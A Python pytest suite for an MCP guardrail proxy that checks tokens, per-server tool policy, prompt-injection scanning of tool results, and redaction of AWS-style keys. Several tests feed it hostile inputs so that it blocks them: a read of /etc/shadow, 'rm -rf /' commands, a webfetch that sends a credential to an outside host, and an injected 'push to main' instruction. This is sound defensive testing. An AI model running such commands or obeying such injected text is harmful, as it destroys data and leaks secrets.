from __future__ import annotations

import json
from collections.abc import Iterator
from dataclasses import replace
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestServer
from anyio.from_thread import start_blocking_portal
from litestar.testing import TestClient

from ads_guardrail.app import create_app
from ads_guardrail.config import Settings
from ads_guardrail.contract import Application, McpServer
from ads_guardrail.guardrail import fingerprint
from ads_policy.audit import BufferedAuditSink, CollectingAuditSink
from ads_policy.client import PolicyClient
from ads_policy.config import DENIED_MESSAGE
from ads_policy.contract import (
    DEFAULT_RESPONSE,
    Binding,
    Capability,
    CheckKind,
    Interception,
    InterceptionPoint,
    Side,
    Switch,
)
from ads_policy.pdp import PolicyDecisionPoint
from ads_policy.policy import org_policy
from ads_policy.run import InMemoryRunStore
from ads_policy.service import PolicyService
from guardrail_helpers import (
    ALICE,
    ALICE_TOKEN,
    API_TOKEN,
    APPLICATION_KEY,
    APPLICATION_NODE_SITE,
    BOB,
    FORGING_KEY,
    INJECTION_MARKER,
    KATA_VM_SITE,
    PERSON_TOKEN_VERIFIER,
    WORKDIR_FILE,
    WORKSPACE,
    InProcessPolicyClient,
    MarkerInjectionScanner,
    opening_body,
    person_token,
)

AWS_KEY = "AKIAQYLPMN5HHHFPZAM2"
SESSION_ID = "3f6c1d2e-session"
ACCEPT_JSON_AND_SSE = {"accept": "application/json, text/event-stream"}
BINDINGS_FOR_TEST_SERVERS = tuple(
    Binding(f"mcp:{server}", tool, capability, argument=argument)
    for server in ("retriever", "containered")
    for tool, capability, argument in (
        ("read", Capability.FS_READ, "filePath"),
        ("webfetch", Capability.NET_EGRESS, "url"),
        ("bash", Capability.PROCESS_EXEC, "command"),
        ("migrate", Capability.DB_MIGRATE, "path"),
    )
)


def _headers_with_bearer(bearer: str) -> dict[str, str]:
    return {**ACCEPT_JSON_AND_SSE, "authorization": f"Bearer {bearer}"}


def _sse_event(message: dict[str, Any], event_id: str = "") -> bytes:
    id_line = f"id: {event_id}\n" if event_id else ""
    return f"{id_line}data: {json.dumps(message)}\n\n".encode()


class FakeMcpServer:
    def __init__(self) -> None:
        self.received_bodies: list[Any] = []
        self.received_headers: list[dict[str, str]] = []
        self.tool_result: Any = "contents of the file"
        self.progress_message = "reading the file"
        self.answers_as_stream = False
        self.escapes_json = False
        self.ended_sessions: list[str] = []
        self.url = ""

    async def post(self, request: web.Request) -> web.StreamResponse:
        self.received_headers.append({k.lower(): v for k, v in request.headers.items()})
        try:
            body = json.loads(await request.read())
        except json.JSONDecodeError:
            return web.json_response({"error": "not json"}, status=400)
        self.received_bodies.append(body)
        if isinstance(body, list):
            return web.json_response([self.answer_to(item) for item in body])
        if "id" not in body:
            return web.Response(status=202)
        if body.get("method") == "initialize":
            return web.json_response(self.answer_to(body), headers={"Mcp-Session-Id": SESSION_ID})
        if body.get("method") == "tools/call" and self.answers_as_stream:
            return await self._streamed_answer(request, body)
        if self.escapes_json:
            text = json.dumps(self.answer_to(body)).replace("AKIA", "\\u0041KIA")
            return web.Response(text=text, content_type="application/json")
        return web.json_response(self.answer_to(body))

    async def _streamed_answer(
        self, request: web.Request, body: dict[str, Any]
    ) -> web.StreamResponse:
        response = web.StreamResponse(headers={"Content-Type": "text/event-stream"})
        await response.prepare(request)
        progress = {
            "jsonrpc": "2.0",
            "method": "notifications/progress",
            "params": {"progressToken": 1, "progress": 1, "message": self.progress_message},
        }
        wire = _sse_event(progress, "1") + _sse_event(self.answer_to(body), "2")
        for start in range(0, len(wire), 7):
            await response.write(wire[start : start + 7])
        await response.write_eof()
        return response

    async def get(self, request: web.Request) -> web.StreamResponse:
        response = web.StreamResponse(headers={"Content-Type": "text/event-stream"})
        await response.prepare(request)
        changed = {"jsonrpc": "2.0", "method": "notifications/tools/list_changed"}
        await response.write(_sse_event(changed))
        await response.write_eof()
        return response

    async def delete(self, request: web.Request) -> web.Response:
        self.ended_sessions.append(request.headers.get("Mcp-Session-Id", ""))
        return web.Response(status=200)

    def answer_to(self, body: dict[str, Any]) -> dict[str, Any]:
        return {
            "jsonrpc": "2.0",
            "id": body.get("id"),
            "result": {"content": [{"type": "text", "text": self.tool_result}]},
        }

    def tool_calls_received(self) -> list[Any]:
        return [
            body
            for body in self.received_bodies
            if isinstance(body, dict) and body.get("method") == "tools/call"
        ]


@pytest.fixture
def mcp() -> Iterator[FakeMcpServer]:
    server = FakeMcpServer()
    app = web.Application()
    app.router.add_post("/mcp", server.post)
    app.router.add_get("/mcp", server.get)
    app.router.add_delete("/mcp", server.delete)
    test_server = TestServer(app)
    with start_blocking_portal("asyncio") as portal:
        portal.call(test_server.start_server)
        server.url = str(test_server.make_url("/mcp"))
        try:
            yield server
        finally:
            portal.call(test_server.close)


def _policy_service(interception: Interception | None = None) -> PolicyService:
    policy = replace(
        org_policy(),
        bindings=BINDINGS_FOR_TEST_SERVERS,
        interception=interception or Interception(),
    )
    return PolicyService(
        PolicyDecisionPoint(policy), InMemoryRunStore(), BufferedAuditSink(CollectingAuditSink())
    )


@pytest.fixture
def policy_service() -> PolicyService:
    return _policy_service()


def _settings_pointing_at(settings: Settings, mcp: FakeMcpServer) -> Settings:
    return replace(
        settings,
        mcp_servers=(
            McpServer("retriever", mcp.url, KATA_VM_SITE),
            McpServer("containered", mcp.url, APPLICATION_NODE_SITE),
        ),
    )


def _client_for(
    settings: Settings,
    policy_client: PolicyClient,
    scanner: MarkerInjectionScanner | None = None,
) -> TestClient:
    app = create_app(
        settings,
        policy_client,
        CollectingAuditSink(),
        PERSON_TOKEN_VERIFIER,
        scanner or MarkerInjectionScanner(),
    )
    return TestClient(app=app)


@pytest.fixture
def scanner() -> MarkerInjectionScanner:
    return MarkerInjectionScanner()


@pytest.fixture
def api(
    settings: Settings,
    policy_client: PolicyClient,
    mcp: FakeMcpServer,
    scanner: MarkerInjectionScanner,
) -> Iterator[TestClient]:
    with _client_for(_settings_pointing_at(settings, mcp), policy_client, scanner) as client:
        yield client


def _tool_call(tool: str, arguments: dict[str, Any], request_id: int = 1) -> dict[str, Any]:
    return {
        "jsonrpc": "2.0",
        "id": request_id,
        "method": "tools/call",
        "params": {"name": tool, "arguments": arguments},
    }


def _post_to_mcp(
    api: TestClient,
    body: Any,
    bearer: str | None = ALICE_TOKEN,
    server: str = "retriever",
    run_id: str = "",
) -> Any:
    headers = _headers_with_bearer(bearer) if bearer else dict(ACCEPT_JSON_AND_SSE)
    if run_id:
        headers["x-ads-run"] = run_id
    response = api.post(f"/mcp/{server}", json=body, headers=headers)
    assert response.status_code == 200
    return response.json()


def _sse_messages(raw: str) -> list[dict[str, Any]]:
    return [
        json.loads(line.removeprefix("data:").strip())
        for line in raw.splitlines()
        if line.startswith("data:")
    ]


def _open_run(api: TestClient, bearer: str = ALICE_TOKEN) -> str:
    response = api.post(
        "/guardrail/runs",
        json=opening_body(bearer),
        headers={"authorization": f"Bearer {API_TOKEN}"},
    )
    assert response.status_code == 201
    return str(response.json()["id"])


def _read_workdir_file() -> dict[str, Any]:
    return _tool_call("read", {"filePath": WORKDIR_FILE})


def test_configured_application_is_served_without_opening_a_run(
    settings: Settings, policy_client: PolicyClient, mcp: FakeMcpServer
) -> None:
    hermes = Application(
        name="hermes", key_sha256=fingerprint(APPLICATION_KEY), workspace=WORKSPACE
    )
    with_hermes = replace(_settings_pointing_at(settings, mcp), applications=(hermes,))
    with _client_for(with_hermes, policy_client) as api:
        answer = _post_to_mcp(api, _read_workdir_file(), bearer=APPLICATION_KEY)
    assert "result" in answer


def test_person_is_recognised_by_their_token(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    assert "result" in _post_to_mcp(api, _read_workdir_file())


def test_refreshed_token_keeps_working_in_the_same_run(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    refreshed = person_token(ALICE, issued_seconds_from_now=-60, jti="refreshed")
    assert "result" in _post_to_mcp(api, _read_workdir_file(), bearer=refreshed)


def test_expired_token_is_refused(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    expired = person_token(issued_seconds_from_now=-3600)
    answer = _post_to_mcp(api, _read_workdir_file(), bearer=expired)
    assert mcp.tool_calls_received() == []
    assert answer["error"]["message"] == DENIED_MESSAGE


def test_forged_token_is_refused(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file(), bearer=person_token(key=FORGING_KEY))
    assert mcp.tool_calls_received() == []
    assert "error" in answer


def test_call_without_credentials_is_refused(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file(), bearer=None)
    assert mcp.tool_calls_received() == []
    assert answer["error"]["message"] == DENIED_MESSAGE


def test_refusal_does_not_explain_itself(api: TestClient) -> None:
    answer = _post_to_mcp(api, _read_workdir_file(), bearer="a-stranger")
    assert answer["error"]["message"] == DENIED_MESSAGE


def test_two_runs_of_one_person_need_the_run_header(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    second = _open_run(api)
    assert "error" in _post_to_mcp(api, _read_workdir_file())
    assert mcp.tool_calls_received() == []
    assert "result" in _post_to_mcp(api, _read_workdir_file(), run_id=second)


def test_run_header_naming_someone_elses_run_is_refused(
    api: TestClient, mcp: FakeMcpServer
) -> None:
    bobs = _open_run(api, person_token(BOB))
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file(), run_id=bobs)
    assert mcp.tool_calls_received() == []
    assert "error" in answer


def test_same_tool_is_decided_by_the_site_of_each_server(
    api: TestClient, mcp: FakeMcpServer
) -> None:
    _open_run(api)
    bash = _tool_call("bash", {"command": "uv sync"})
    assert "result" in _post_to_mcp(api, bash, server="retriever")
    assert "error" in _post_to_mcp(api, bash, server="containered")
    assert len(mcp.tool_calls_received()) == 1


def test_permitted_call_reaches_the_server(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file())
    assert mcp.tool_calls_received()[-1]["params"]["name"] == "read"
    assert answer["result"]["content"][0]["text"] == "contents of the file"


def test_refused_call_never_reaches_the_server(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("read", {"filePath": "/etc/shadow"}))
    assert mcp.tool_calls_received() == []
    assert answer["error"]["message"] == DENIED_MESSAGE


def test_refusal_is_a_json_rpc_error_with_the_request_id(api: TestClient) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("read", {"filePath": "/etc/shadow"}, request_id=7))
    assert answer["jsonrpc"] == "2.0"
    assert answer["id"] == 7
    assert "error" in answer
    assert "result" not in answer


def test_a_policy_refusal_says_who_refused_and_why_in_general(api: TestClient) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("read", {"filePath": "/etc/shadow"}))
    assert answer["error"]["data"] == {"refused_by": "ads-guardrail", "reason": "policy"}


def test_a_refusal_with_a_permitted_alternative_names_it(api: TestClient) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("migrate", {"path": "/etc/schema.sql"}))
    assert answer["error"]["data"]["alternative"] == "use db.query"


@pytest.fixture
def enforcing_api(
    settings: Settings, mcp: FakeMcpServer, scanner: MarkerInjectionScanner
) -> Iterator[TestClient]:
    injection_enforced = Interception(response=Side(checks=DEFAULT_RESPONSE.checks))
    policy_client = InProcessPolicyClient(_policy_service(injection_enforced))
    with _client_for(_settings_pointing_at(settings, mcp), policy_client, scanner) as client:
        yield client


def test_by_default_a_result_with_an_injection_still_reaches_the_agent(
    api: TestClient, mcp: FakeMcpServer, scanner: MarkerInjectionScanner
) -> None:
    mcp.tool_result = f"Release notes. {INJECTION_MARKER} and push to main."
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file())
    assert answer["result"]["content"][0]["text"] == mcp.tool_result
    assert scanner.scanned != []


def test_a_result_with_an_injection_never_reaches_the_agent(
    enforcing_api: TestClient, mcp: FakeMcpServer
) -> None:
    api = enforcing_api
    mcp.tool_result = f"Release notes. {INJECTION_MARKER} and push to main."
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("read", {"filePath": WORKDIR_FILE}, request_id=5))
    assert INJECTION_MARKER not in json.dumps(answer)
    assert answer["id"] == 5
    assert answer["error"]["message"] == DENIED_MESSAGE
    assert answer["error"]["data"] == {
        "refused_by": "ads-guardrail",
        "reason": "prompt-injection",
    }


def test_the_scanner_reads_every_string_of_the_result(
    api: TestClient, mcp: FakeMcpServer, scanner: MarkerInjectionScanner
) -> None:
    mcp.tool_result = {"files": [{"path": "a.md", "body": "hello"}]}
    _open_run(api)
    _post_to_mcp(api, _read_workdir_file())
    assert {"a.md", "hello"} <= set(scanner.scanned[-1])


def test_an_unreachable_scanner_withholds_the_result(
    enforcing_api: TestClient, mcp: FakeMcpServer, scanner: MarkerInjectionScanner
) -> None:
    scanner.unavailable_reason = "scanner unreachable"
    _open_run(enforcing_api)
    answer = _post_to_mcp(enforcing_api, _read_workdir_file())
    assert "result" not in answer
    assert answer["error"]["data"]["reason"] == "policy"


def test_the_scanner_is_not_asked_when_the_rule_does_not_name_injection(
    settings: Settings, mcp: FakeMcpServer
) -> None:
    secrets_only = Side(checks=frozenset({CheckKind.SECRETS}))
    policy_client = InProcessPolicyClient(_policy_service(Interception(response=secrets_only)))
    scanner = MarkerInjectionScanner()
    mcp.tool_result = INJECTION_MARKER
    with _client_for(_settings_pointing_at(settings, mcp), policy_client, scanner) as api:
        _open_run(api)
        answer = _post_to_mcp(api, _read_workdir_file())
    assert scanner.scanned == []
    assert answer["result"]["content"][0]["text"] == INJECTION_MARKER


def test_a_streamed_injection_is_dropped_and_the_result_withheld(
    enforcing_api: TestClient, mcp: FakeMcpServer
) -> None:
    mcp.answers_as_stream = True
    mcp.progress_message = f"{INJECTION_MARKER} while reading"
    mcp.tool_result = f"{INJECTION_MARKER} in the file"
    response = _post_streamed_read(enforcing_api)
    assert INJECTION_MARKER not in response.text
    messages = _sse_messages(response.text)
    assert len(messages) == 1
    assert messages[0]["error"]["data"]["reason"] == "prompt-injection"
    assert "id: 2" in response.text.splitlines()


def test_unbound_tool_is_refused(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    answer = _post_to_mcp(api, _tool_call("telepathy", {"thought": "rm -rf /"}))
    assert mcp.tool_calls_received() == []
    assert "error" in answer


def test_credential_in_arguments_is_refused(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    leaking = _tool_call("webfetch", {"url": "mirror.interlab", "body": f"K={AWS_KEY}"})
    answer = _post_to_mcp(api, leaking)
    assert mcp.tool_calls_received() == []
    assert "error" in answer


@pytest.mark.parametrize("nested", [{"deep": {"k": "v"}}, [1, 2, 3], 42])
def test_nested_arguments_are_accepted(api: TestClient, mcp: FakeMcpServer, nested: Any) -> None:
    _open_run(api)
    _post_to_mcp(api, _tool_call("bash", {"command": "uv sync", "extra": nested}))
    assert mcp.tool_calls_received() != []


def test_batch_with_a_tool_call_is_refused_whole(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    batch = [
        {"jsonrpc": "2.0", "id": 1, "method": "ping"},
        _tool_call("bash", {"command": "rm -rf /"}, request_id=2),
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
    ]
    answers = _post_to_mcp(api, batch)
    assert mcp.received_bodies == []
    assert [answer["id"] for answer in answers] == [1, 2]
    assert all("error" in answer for answer in answers)


def test_batch_without_tool_calls_is_forwarded(api: TestClient, mcp: FakeMcpServer) -> None:
    batch = [{"jsonrpc": "2.0", "id": 1, "method": "ping"}]
    _post_to_mcp(api, batch)
    assert mcp.received_bodies == [batch]


def test_credential_in_result_is_redacted(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.tool_result = f"export KEY={AWS_KEY}"
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file())
    assert answer["result"]["content"][0]["text"] == "export KEY=[redacted:aws-access-token]"


def test_json_escaped_credential_is_redacted(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.tool_result = f"export KEY={AWS_KEY}"
    mcp.escapes_json = True
    _open_run(api)
    answer = _post_to_mcp(api, _read_workdir_file())
    assert answer["result"]["content"][0]["text"] == "export KEY=[redacted:aws-access-token]"


def test_structured_result_keeps_its_shape(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.tool_result = {"files": [{"path": "a.env", "size": 3, "body": f"KEY={AWS_KEY}"}]}
    _open_run(api)
    returned = _post_to_mcp(api, _read_workdir_file())["result"]["content"][0]["text"]
    assert returned["files"][0]["size"] == 3
    assert returned["files"][0]["path"] == "a.env"
    assert returned["files"][0]["body"] == "KEY=[redacted:aws-access-token]"


def test_clean_result_is_returned_byte_for_byte(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    raw = api.post(
        "/mcp/retriever", json=_read_workdir_file(), headers=_headers_with_bearer(ALICE_TOKEN)
    )
    assert raw.content == json.dumps(mcp.answer_to({"id": 1})).encode()


def test_inbound_review_returns_the_result_unredacted(
    settings: Settings, mcp: FakeMcpServer
) -> None:
    mcp.tool_result = f"export KEY={AWS_KEY}"
    reviewing = Side(checks=DEFAULT_RESPONSE.checks, on=Switch.REVIEW)
    policy_client = InProcessPolicyClient(_policy_service(Interception(response=reviewing)))
    with _client_for(_settings_pointing_at(settings, mcp), policy_client) as api:
        _open_run(api)
        answer = _post_to_mcp(api, _read_workdir_file())
    assert AWS_KEY in json.dumps(answer)


def _post_streamed_read(api: TestClient) -> Any:
    _open_run(api)
    return api.post(
        "/mcp/retriever", json=_read_workdir_file(), headers=_headers_with_bearer(ALICE_TOKEN)
    )


def test_streamed_answer_stays_a_stream(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.answers_as_stream = True
    response = _post_streamed_read(api)
    assert response.headers["content-type"].startswith("text/event-stream")
    messages = _sse_messages(response.text)
    assert messages[0]["method"] == "notifications/progress"
    assert messages[1]["result"]["content"][0]["text"] == "contents of the file"


def test_every_stream_event_is_inspected(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.answers_as_stream = True
    mcp.progress_message = f"found KEY={AWS_KEY} while reading"
    mcp.tool_result = f"export KEY={AWS_KEY}"
    response = _post_streamed_read(api)
    assert AWS_KEY not in response.text
    progress, result = _sse_messages(response.text)
    assert "[redacted:aws-access-token]" in progress["params"]["message"]
    assert "[redacted:aws-access-token]" in result["result"]["content"][0]["text"]


def test_rewritten_event_keeps_its_id(api: TestClient, mcp: FakeMcpServer) -> None:
    mcp.answers_as_stream = True
    mcp.tool_result = f"export KEY={AWS_KEY}"
    assert "id: 2" in _post_streamed_read(api).text.splitlines()


def test_oversized_event_cuts_the_stream(
    api: TestClient, mcp: FakeMcpServer, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("ads_guardrail.proxy.MAX_EVENT_BYTES", 64)
    mcp.answers_as_stream = True
    mcp.tool_result = f"export KEY={AWS_KEY} " + "x" * 200
    assert AWS_KEY not in _post_streamed_read(api).text


def test_listening_stream_is_passed_through(api: TestClient) -> None:
    response = api.get("/mcp/retriever", headers={"accept": "text/event-stream"})
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/event-stream")
    assert _sse_messages(response.text)[0]["method"] == "notifications/tools/list_changed"


def test_non_tool_messages_are_forwarded(api: TestClient, mcp: FakeMcpServer) -> None:
    for method in ("initialize", "ping", "tools/list", "resources/list"):
        _post_to_mcp(api, {"jsonrpc": "2.0", "id": 1, "method": method})
    assert [body["method"] for body in mcp.received_bodies] == [
        "initialize",
        "ping",
        "tools/list",
        "resources/list",
    ]


def test_session_id_is_returned_to_the_agent(api: TestClient) -> None:
    response = api.post(
        "/mcp/retriever",
        json={"jsonrpc": "2.0", "id": 1, "method": "initialize"},
        headers=ACCEPT_JSON_AND_SSE,
    )
    assert response.headers["mcp-session-id"] == SESSION_ID


def test_agent_headers_reach_the_server(api: TestClient, mcp: FakeMcpServer) -> None:
    _open_run(api)
    api.post(
        "/mcp/retriever",
        json=_read_workdir_file(),
        headers={
            **_headers_with_bearer(ALICE_TOKEN),
            "mcp-session-id": SESSION_ID,
            "mcp-protocol-version": "2025-06-18",
        },
    )
    received = mcp.received_headers[-1]
    assert received["authorization"] == f"Bearer {ALICE_TOKEN}"
    assert received["mcp-session-id"] == SESSION_ID
    assert received["mcp-protocol-version"] == "2025-06-18"
    assert received["accept"] == ACCEPT_JSON_AND_SSE["accept"]


def test_run_header_is_not_forwarded(api: TestClient, mcp: FakeMcpServer) -> None:
    run_id = _open_run(api)
    _post_to_mcp(api, _read_workdir_file(), run_id=run_id)
    assert "x-ads-run" not in mcp.received_headers[-1]


def test_notification_gets_an_empty_202(api: TestClient) -> None:
    response = api.post(
        "/mcp/retriever",
        json={"jsonrpc": "2.0", "method": "notifications/initialized"},
        headers=ACCEPT_JSON_AND_SSE,
    )
    assert response.status_code == 202
    assert response.content == b""


def test_session_end_reaches_the_server(api: TestClient, mcp: FakeMcpServer) -> None:
    response = api.delete("/mcp/retriever", headers={"mcp-session-id": SESSION_ID})
    assert response.status_code == 200
    assert mcp.ended_sessions == [SESSION_ID]


def test_non_json_body_is_forwarded_unchanged(api: TestClient) -> None:
    assert api.post("/mcp/retriever", content=b"not json at all").status_code == 400


def test_unlisted_server_is_not_found(api: TestClient, mcp: FakeMcpServer) -> None:
    assert api.post("/mcp/elsewhere", json=_read_workdir_file()).status_code == 404
    assert mcp.received_bodies == []


def test_tools_of_different_servers_are_bound_separately(
    settings: Settings, mcp: FakeMcpServer
) -> None:
    only_retriever_bound = replace(
        org_policy(),
        bindings=tuple(b for b in BINDINGS_FOR_TEST_SERVERS if b.source == "mcp:retriever"),
    )
    service = PolicyService(
        PolicyDecisionPoint(only_retriever_bound),
        InMemoryRunStore(),
        BufferedAuditSink(CollectingAuditSink()),
    )
    with _client_for(_settings_pointing_at(settings, mcp), InProcessPolicyClient(service)) as api:
        _open_run(api)
        assert "result" in _post_to_mcp(api, _read_workdir_file(), server="retriever")
        assert "error" in _post_to_mcp(api, _read_workdir_file(), server="containered")


def test_unreachable_server_is_a_bad_gateway(
    settings: Settings, policy_client: PolicyClient
) -> None:
    unreachable = replace(
        settings, mcp_servers=(McpServer("gone", "http://127.0.0.1:9/mcp", KATA_VM_SITE),)
    )
    with _client_for(unreachable, policy_client) as api:
        response = api.post("/mcp/gone", json={"jsonrpc": "2.0", "id": 1, "method": "ping"})
    assert response.status_code == 502


def test_decision_api_names_the_recognised_capability(api: TestClient) -> None:
    run_id = _open_run(api)
    response = api.post(
        "/guardrail/permissions",
        headers={"authorization": f"Bearer {API_TOKEN}"},
        json={
            "run_id": run_id,
            "source": "mcp:retriever",
            "tool": "read",
            "arguments": {"filePath": WORKDIR_FILE},
        },
    )
    assert response.status_code == 201
    decision = response.json()
    assert decision["capability"] == Capability.FS_READ.value
    assert decision["point"] == InterceptionPoint.CALL.value
